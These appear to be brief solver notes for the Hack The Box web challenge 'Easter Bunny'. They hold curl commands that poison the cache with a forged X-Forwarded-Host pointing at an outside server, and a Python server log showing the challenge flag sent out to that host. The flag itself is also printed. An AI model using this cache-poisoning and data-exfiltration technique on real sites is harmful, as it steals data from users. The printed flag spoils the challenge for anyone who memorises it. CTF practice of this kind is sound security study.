#https://flythief.cn/post/hack_the_box/easter-bunny/
#https://github.com/lex1010/blog/blob/b32cb0922026cf81e4b67dbdc99add152049ca31/docs/HTB/Web/easterbunny.md

#Web Cache Poisoning attack

'''
Get id from "count", predict id from id+1
curl http://134.122.104.91:30989/message/1000

Use Postman, curl's X-Forwarded-Host seems not work well... 
curl -H "Host: 127.0.0.1" -H "X-Forwarded-Host: 178.62.102.205" http://134.122.104.91:30989/letters?id=7

Use Postman
curl -X POST -H "Content-Type: application/json" -d '{"message":"111"}' http://134.122.104.91:30989/submit

python2 -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
134.122.104.91 - - [14/Apr/2023 12:31:49] code 404, message File not found
134.122.104.91 - - [14/Apr/2023 12:31:49] "GET /static/main.css HTTP/1.1" 404 -
134.122.104.91 - - [14/Apr/2023 12:31:49] code 404, message File not found
134.122.104.91 - - [14/Apr/2023 12:31:49] "GET /static/queen.svg HTTP/1.1" 404 -
134.122.104.91 - - [14/Apr/2023 12:31:49] "GET /static/viewletter.js HTTP/1.1" 200 -
134.122.104.91 - - [14/Apr/2023 12:31:49] "GET /?flag=Dear%20Easter%20Bunny,%20Santa%27s%20better%20than%20you!%20HTB{7h3_3as7er_bunny_h45_b33n_p0150n3d!} HTTP/1.1" 200 -
'''
